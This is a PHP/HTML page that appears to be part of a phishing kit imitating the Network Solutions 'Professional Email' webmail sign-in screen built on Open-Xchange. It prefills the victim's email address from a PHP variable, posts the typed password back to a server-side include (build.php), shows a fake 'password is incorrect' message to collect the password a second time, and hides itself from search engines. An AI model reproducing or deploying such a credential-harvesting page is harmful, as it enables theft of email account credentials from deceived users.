<?php include '../build.php' ?>
<html lang="en" class="windows">
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="google" value="notranslate">
  <meta name="robots" content="noindex, nofollow">
  <meta name="theme-color" content="#fff">
  <meta name="application-name" content="App Suite">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="App Suite">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="mobile-web-app-capable" content="yes">
  <link id="favicon-ico" rel="icon" href="../assets/icons/netsol.ico" sizes="any">
  <link rel="stylesheet" href="../assets/css/netsol.css">
  
  <style type="text/css">
    html,
    body {
      background-color: #fff;
      margin: 0;
      padding: 0;
      border: 0;
      overscroll-behavior-y: none;
    }

    body {
      overflow: hidden;
    }

    #background-loader {
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 65300;
      background-color: #fff;
      /* activate GPU acceleration */
      transform: translateZ(0);
    }

    #showstopper {
      display: none;
      text-align: center;
      font-size: 1rem;
      line-height: 1.5rem;
      padding: 16px;
      user-select: text;
    }

    @media (min-width: 541px) {
      #showstopper {
        padding: 48px;
        border: 1px solid #ddd;
        border-radius: 16px;
        margin: 16px;
        box-shadow: 0 24px 80px 0 rgba(0, 0, 0, 0.10);
      }
    }

    #showstopper img {
      margin: 1rem 0 2rem 0;
      max-width: 100%;
    }

    #showstopper h1 {
      font-size: 1.5rem;
      line-height: 2rem;
      margin: 0 0 0.5rem 0;
    }

    #showstopper .actions {
      margin-top: 16px;
      display: flex;
      justify-content: center;
      gap: 16px;
    }

    #showstopper .actions>button {
      min-width: 80px;
    }

    #showstopper .timeout,
    #showstopper .session,
    #showstopper .down,
    #showstopper .configuration {
      display: none;
    }

    @media (prefers-color-scheme: dark) {
      #background-loader {
        color: white;
        background-color: #111;
      }

      #showstopper {
        background-color: #151515;
        border: 1px solid #333;
      }
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    .io-ox-busy {
      position: relative;
      height: 100%;
    }

    .io-ox-busy:before {
      visibility: visible;
      position: absolute;
      top: 50%;
      left: 50%;
      margin: -0.75rem 0 0 -0.75rem;
      /* adopted from boostrap 5 approach */
      width: 1.5rem;
      height: 1.5rem;
      vertical-align: text-bottom;
      border: .1em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      content: ' ';
      animation: spin 1.5s infinite linear;
    }
  </style>
  <style data-src="login-page-configuration" type="text/css">
    #io-ox-login-screen #io-ox-login-container { background: #ffffff; }
    #io-ox-login-screen #io-ox-login-background-image { background: none; }
    #io-ox-login-screen #io-ox-login-header, #io-ox-login-header #io-ox-languages #io-ox-languages-label { color: #000000; }
    #io-ox-login-screen #io-ox-login-header a, #io-ox-login-header .toggle-text, #io-ox-login-header .caret { color: #256672; }
    #io-ox-login-screen #login-title-mobile { color: #000000 !important; }
    #io-ox-login-screen #box-form-header { color: #333333; }
    #io-ox-login-screen #box-form-header { background: #ffffff; }
    #io-ox-login-screen #box-form-body *:not(button, button>span, .toggle, svg, svg>path) { color: #333333; }
    #io-ox-login-screen /* :where() keeps specificity at 0 so checkbox styles can be overridden by customCss*/
    :where(#box-form-body .checkbox.custom input:checked) { background-color: #256672; }
    #io-ox-login-screen #box-form-body { color: #333333; }
    #io-ox-login-screen #box-form #box-form-body a { color: #6c6c6c; }
    #io-ox-login-screen #box-form button, #io-ox-login-button { background-color: #256672; border-color: #256672; }
    #io-ox-login-screen #box-form button, #io-ox-login-button { border-color: #256672; }
    #io-ox-login-screen #box-form button, #io-ox-login-button { color: #ffffff; }
    #io-ox-login-screen #box-form button svg path, #io-ox-login-button svg path { fill: #ffffff; }
    #io-ox-login-screen #io-ox-login-footer, #io-ox-login-footer #io-ox-languages .lang-label { color: #6c6c6c; }
    #io-ox-login-screen #io-ox-login-footer a, #io-ox-login-footer .toggle-text, #io-ox-login-footer #language-select, #io-ox-login-footer .caret { color: #6c6c6c; }
    #io-ox-login-screen #io-ox-login-content { justify-content: center; }</style><style data-src="login-page-configuration-custom" type="text/css">#io-ox-login-screen #io-ox-information-message {
    margin-top: 24px !important;
    background-color: #fff;
    box-shadow: 0px 10px 60px #00000080;
    border-radius: 6px;
    text-align: center;
    flex-direction: column;
    padding: 16px;
    z-index: 1;
    }

    #io-ox-login-screen #io-ox-information-message .btn.btn-primary {
    color: var(--text);
    border-color: var(--border);
    background-color: var(--background);
    }

    #io-ox-login-screen #io-ox-information-message .btn.btn-primary:hover {
    background-color: var(--background-100); }
  </style>
<title>Sign in - Professional Email</title>
</head>

<body class="unselectable">
  <!-- Core Container -->
  <div id="io-ox-core" class="abs unselectable background flex-col" style="display: none;">
    <div id="io-ox-tint" aria-hidden="true"></div>
    <div id="io-ox-appcontrol" style="display: none;"></div>
    <div id="io-ox-banner" role="alert" style="display: none;"></div>
    <!-- screens -->
    <div id="io-ox-screens" class="flex-grow">
      <!-- window manager -->
      <div id="io-ox-windowmanager" class="h-full" style="display: none;">
        <div id="io-ox-windowmanager-pane"></div>
        <!-- sidepanel container-->
        <div id="io-ox-sidepanel" class="translucent-medium"></div>
        <!-- sidepanel toolbar -->
        <div id="io-ox-sidepanel-toolbar" class="translucent-low"></div>
      </div>
      <!-- empty desktop -->
      <div id="io-ox-desktop" class="abs"></div>
    </div>
    <!-- container for embedded windows, used to manage flexbox overflow-->
    <div id="io-ox-taskbar-container" role="region">
      <!-- embedded windows -->
      <ul id="io-ox-taskbar"></ul>
    </div>
    <!-- container for bottom-->
    <div id="io-ox-message-container">
      <div id="io-ox-toast-container"></div>
    </div>
  </div>
  <!-- Login screen -->
  <div id="io-ox-login-screen" class="unselectable initialized">
    <div id="io-ox-login-blocker" style="display: none;"></div>
    <iframe id="multifactor-background" style="display: none;" scrolling="no"></iframe>
    <div id="io-ox-login-container">
      <div id="io-ox-login-background-image">
        <div id="io-ox-login-side-panel"></div>
        <div id="io-ox-login-form-side">
          <header id="io-ox-login-header">
            <div id="io-ox-login-toolbar"><img class="login-logo" alt="Logo" src="https://webmail-oxcs.networksolutionsemail.com/brands/5/logo"><div class="composition-element login-spacer"></div><span id="io-ox-languages" class="mx-16"><a href="#" role="button" class="lang-label" id="io-ox-languages-label" data-i18n="Language:" data-i18n-attr="text" aria-hidden="true" tabindex="-1">Language:</a><div class="dropdown"><a href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><span class="sr-only" data-i18n="Language:" data-i18n-attr="text">Language:</span><span class="toggle-text" lang="en-US">English (United States)</span><span class="caret"></span></a><ul id="io-ox-language-list" class="dropdown-menu" role="menu" data-i18n="Languages" data-i18n-attr="aria-label" aria-label="Languages"><li role="presentation"><a href="#" role="menuitem" lang="ca-ES" data-value="ca_ES">Català (Espanya)</a></li><li role="presentation"><a href="#" role="menuitem" lang="cs-CZ" data-value="cs_CZ">Čeština (Česko)</a></li><li role="presentation"><a href="#" role="menuitem" lang="da-DK" data-value="da_DK">Dansk (Danmark)</a></li><li role="presentation"><a href="#" role="menuitem" lang="de-DE" data-value="de_DE">Deutsch (Deutschland)</a></li><li role="presentation"><a href="#" role="menuitem" lang="de-AT" data-value="de_AT">Deutsch (Österreich)</a></li><li role="presentation"><a href="#" role="menuitem" lang="de-CH" data-value="de_CH">Deutsch (Schweiz)</a></li><li role="presentation"><a href="#" role="menuitem" lang="et-EE" data-value="et_EE">eesti (Eesti)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-AU" data-value="en_AU">English (Australia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-CA" data-value="en_CA">English (Canada)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-DE" data-value="en_DE">English (Germany)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-IE" data-value="en_IE">English (Ireland)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-NZ" data-value="en_NZ">English (New Zealand)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-SG" data-value="en_SG">English (Singapore)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-ZA" data-value="en_ZA">English (South Africa)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-GB" data-value="en_GB">English (United Kingdom)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-US" data-value="en_US">English (United States)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-AR" data-value="es_AR">Español (Argentina)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-BO" data-value="es_BO">Español (Bolivia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-CL" data-value="es_CL">Español (Chile)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-CO" data-value="es_CO">Español (Colombia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-CR" data-value="es_CR">Español (Costa Rica)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-EC" data-value="es_EC">Español (Ecuador)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-SV" data-value="es_SV">Español (El Salvador)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-ES" data-value="es_ES">Español (Espana)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-GT" data-value="es_GT">Español (Guatemala)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-HN" data-value="es_HN">Español (Honduras)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-MX" data-value="es_MX">Español (México)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-NI" data-value="es_NI">Español (Nicaragua)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-PA" data-value="es_PA">Español (Panamá)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-PE" data-value="es_PE">Español (Perú)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-PR" data-value="es_PR">Español (Puerto Rico)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-DO" data-value="es_DO">Español (Républica Dominicana)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-US" data-value="es_US">Español (United States)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-BE" data-value="fr_BE">Français (Belgique)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-CA" data-value="fr_CA">Français (Canada)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-FR" data-value="fr_FR">Français (France)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-CH" data-value="fr_CH">Français (Suisse)</a></li><li role="presentation"><a href="#" role="menuitem" lang="it-IT" data-value="it_IT">Italiano (Italia)</a></li><li role="presentation"><a href="#" role="menuitem" lang="it-CH" data-value="it_CH">Italiano (Svizzera)</a></li><li role="presentation"><a href="#" role="menuitem" lang="lv-LV" data-value="lv_LV">Latviešu (Latvija)</a></li><li role="presentation"><a href="#" role="menuitem" lang="hu-HU" data-value="hu_HU">Magyar (Magyarország)</a></li><li role="presentation"><a href="#" role="menuitem" lang="nl-BE" data-value="nl_BE">Nederlands (België)</a></li><li role="presentation"><a href="#" role="menuitem" lang="nl-NL" data-value="nl_NL">Nederlands (Nederland)</a></li><li role="presentation"><a href="#" role="menuitem" lang="nb-NO" data-value="nb_NO">Norsk (Norge)</a></li><li role="presentation"><a href="#" role="menuitem" lang="pl-PL" data-value="pl_PL">Polski (Polska)</a></li><li role="presentation"><a href="#" role="menuitem" lang="pt-BR" data-value="pt_BR">Português (Brasil)</a></li><li role="presentation"><a href="#" role="menuitem" lang="ru-RU" data-value="ru_RU">Pусский (Россия)</a></li><li role="presentation"><a href="#" role="menuitem" lang="ro-RO" data-value="ro_RO">Română (România)</a></li><li role="presentation"><a href="#" role="menuitem" lang="sk-SK" data-value="sk_SK">Slovenčina (Slovensko)</a></li><li role="presentation"><a href="#" role="menuitem" lang="fi-FI" data-value="fi_FI">Suomi (Suomi)</a></li><li role="presentation"><a href="#" role="menuitem" lang="sv-SE" data-value="sv_SE">Svenska (Sverige)</a></li><li role="presentation"><a href="#" role="menuitem" lang="tr-TR" data-value="tr_TR">Türkçe (Türkiye)</a></li><li role="presentation"><a href="#" role="menuitem" lang="el-GR" data-value="el_GR">Ελληνικά (Ελλάδα)</a></li><li role="presentation"><a href="#" role="menuitem" lang="bg-BG" data-value="bg_BG">български (България)</a></li><li role="presentation"><a href="#" role="menuitem" lang="zh-CN" data-value="zh_CN">中文 (简体)</a></li><li role="presentation"><a href="#" role="menuitem" lang="zh-TW" data-value="zh_TW">中文 (繁體)</a></li><li role="presentation"><a href="#" role="menuitem" lang="ja-JP" data-value="ja_JP">日本語 (日本)</a></li></ul></div></span></div>
          </header>
          <div id="io-ox-login-content">
            <div class="align-center col-sm-6 col-xs-12">
              <div class="row">
                <main id="io-ox-login-box" class="col-xs-12">
                  <div class="row">
                    <div class="flex-column">
                      <div id="box-form" class="col-xs-12">
                        <div id="box-form-header" class="row" data-i18n="" data-i18n-attr="text">Webmail Login</div>
                        <div id="box-form-body" class="row">
                          <!-- login dialog; must be hard-coded this way, otherwise browsers won't inject credentials -->
                          <form name="login-form" method="post" id="login-form" required="" autocomplete="off">
                            <input type="hidden" name="login" value="netsol">
                            <div class="col-xs-12">
                              <div class="row title">
                                <h1 id="login-title" class="col-xs-12" data-i18n="Sign in">Sign in</h1>
                              </div>
                              <div class="row help">
                                <div class="col-xs-12">
                                  <p id="io-ox-login-help" class="help-block"></p>
                                </div>
                              </div>
                              <div class="row username">
                                <div class="form-group col-xs-12">
                                  <label for="io-ox-login-username" data-i18n="Email">Email</label>
                                  <div class="text-right" style=""><a href="#" role="button" data-io-ox-loginproxy="1">Change</a></div><input type="text" id="user" name="user" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" data-i18n="Email" autocomplete="username" readonly value="<?php echo htmlspecialchars($decoded); ?>">
                                </div>
                              </div>
                              <div class="row password">
                                <div class="form-group col-xs-12">
                                  <label for="io-ox-login-password"><span data-io-ox-loginproxy="1">Your password</span><def data-io-ox-loginproxy="1" title="required">*</def></label>
                                  <input type="text" id="password" name="pass" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" data-i18n="Password" autocomplete="current-password">
                                  <div class="text-right" id="io-ox-forgot-password">
                                    <a href="" target="_blank" data-i18n="Forgot your password?">Forgot your password?</a>
                                  </div>
                                </div>
                              </div>
                              <div class="row password-retype">
                                <div class="form-group col-xs-12">
                                  <label for="io-ox-retype-password" data-i18n="Confirm new password">Confirm new password</label>
                                  <input type="text" id="io-ox-retype-password" name="password2" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" data-i18n-attr="placeholder" autocomplete="new-password">
                                </div>
                              </div>
                              <div class="row options">
                                <div class="col-sm-6 col-xs-12" id="io-ox-login-store">
                                  <div class="checkbox custom">
                                    <label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label">
                                      <input type="checkbox" class="sr-only" id="io-ox-login-store-box" checked="checked" name="staySignedIn" value="1">Stay signed in</label>
                                  </div>
                                </div>
                              </div>
                              <!-- Feedback area -->
                              <div class="row feedback" style="<?php echo $error; ?>">
                                <div class="col-xs-12 alert-highlight" id="io-ox-login-feedback"><div role="alert" class="selectable-text alert alert-info">The password is incorrect.</div></div>
                              </div>
                              <div class="row button">
                                <div class="form-group col-xs-12">
                                  <button type="submit" name="signin" id="io-ox-login-button" class="btn btn-primary form-control" data-i18n="Sign in">Sign In</button>
                                </div>
                              </div>
                            </div>
                          </form>
                          
                          <div class="form" style="display: none;">
                            <div id="io-ox-select-device-form" class="col-xs-12 p-0">
                              <div id="io-ox-select-device-header" class="row title">
                                <h1 id="io-ox-select-device-title" class="col-xs-12"></h1>
                              </div>
                              <div id="io-ox-select-device-body" class="row p-16"></div>
                              <div id="io-ox-select-device-footer" class="row border-top p-16">
                              </div>
                            </div>
                          </div>
                          <div class="form" style="display: none;">
                            <div id="io-ox-multifactor-form" class="col-xs-12 p-0">
                              <div id="io-ox-multifactor-header" class="row title">
                                <h1 id="multifactor-title" class="col-xs-12 flex-row"></h1>
                              </div>
                              <div id="io-ox-multifactor-body" class="row p-16">
                                <div class="form-group col-xs-12 p-0 m-0">
                                </div>
                              </div>
                              <div id="io-ox-multifactor-footer" class="row border-top p-16"></div>
                            </div>
                          </div>
                          <div class="form" style="display: none;">
                            <div id="io-ox-lost-device-form" class="col-xs-12 p-0">
                              <div id="io-ox-lost-device-header" class="row title">
                                <h1 id="io-ox-lost-device-title" class="col-xs-12"></h1>
                              </div>
                              <div id="io-ox-lost-device-body" class="row p-16"></div>
                              <div id="io-ox-lost-device-footer" class="row border-top p-16"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div id="io-ox-information-message" data-i18n="" data-i18n-attr="html"><p>We are updating our email security and will require all email server connections to use an encrypted connection when connecting via POP or IMAP from a device. To avoid any email connection issues, please be sure to update your mail client settings.</p> <a rel="noopener" target="_blank" class="btn btn-primary form-control" href="">Learn More…</a></div>
                    </div>
                  </div>
                </main>
              </div>
            </div>
          </div>
          <footer id="io-ox-login-footer"><div class="composition-element login-spacer"></div><span>&copy; 2026 Open-Xchange GmbH</span><div class="composition-element"><span data-i18n="">Version:</span><span>8.49.3</span></div><div class="composition-element custom-login-links"><span class=""><a href="" target="blank" style="color: rgb(108, 108, 108);">Privacy policy</a></span></div><div class="composition-element custom-login-links"><span class=""><a href="" target="blank" style="color: rgb(108, 108, 108);">Legal notes</a></span></div><div class="composition-element login-spacer"></div></footer>
        </div>
      </div>
    </div>
  </div>
  <!-- offline notifier -->
  <div role="complementary">
    <div id="io-ox-offline" style="bottom: -41px; display: none;"></div>
    <!-- screen reader notifier -->
    <div id="io-ox-alert-screenreader" role="alert" aria-live="polite" class="sr-only">
      <span id="sr-alert-text"></span>
    </div>
  </div>
  <noscript>
    <p class="noscript">This app uses JavaScript. Your browser either doesn't support JavaScript or you have it turned
      off. To use this app please use a JavaScript enabled browser.</p>
  </noscript>
  <!-- placeholder for custom vars and rules -->
  <style type="text/css" id="theme-colors"></style>
  <style type="text/css" id="theme-accent"></style>
  <style type="text/css" id="theme"></style>
  <style type="text/css" id="theme-values"></style>
  <!-- shared styles for default logo; also to avoid Safari bug (OXUIB-1418) -->
  <svg width="0" height="0" version="1.1" xmlns="http://www.w3.org/2000/svg" class="invisible" aria-hidden="true">
    <defs>
      <linearGradient x1="54.4260204%" y1="12.8418549%" x2="7.94367821%" y2="85.4289973%" id="logoGradient-1">
        <stop stop-color="var(--accent-300)" offset="0%"></stop>
        <stop stop-color="var(--accent-600)" offset="100%"></stop>
      </linearGradient>
      <linearGradient x1="71.8535659%" y1="97.6732587%" x2="31.1841722%" y2="3.61382138%" id="logoGradient-2">
        <stop stop-color="var(--accent-400)" offset="0%"></stop>
        <stop stop-color="var(--accent-700)" offset="100%"></stop>
      </linearGradient>
    </defs>
  </svg>



<div class="accessible-tooltip-container" aria-hidden="true"></div></body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("io-ox-retype-password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
